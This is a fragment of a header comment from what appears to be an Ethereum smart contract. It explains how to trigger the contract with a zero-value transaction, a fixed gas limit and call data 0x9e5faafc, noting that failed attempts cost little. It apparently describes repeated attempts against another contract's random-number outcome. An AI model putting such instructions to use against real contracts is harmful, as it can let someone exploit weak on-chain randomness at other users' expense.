/**
 * How to use just send a tx of 0 eth to this contract address with 600k gas limit and message data 0x9e5faafc
 * although it will probably not use that much it is just to be safe, as metamask will say the tx will fail
 * because it doesnt know what the random number will be so you have to put the gas limit in yourself, also
 * remember any unused gas is refunded so it wont cost much even if it fails. (failed tx will cost only a couple cents)
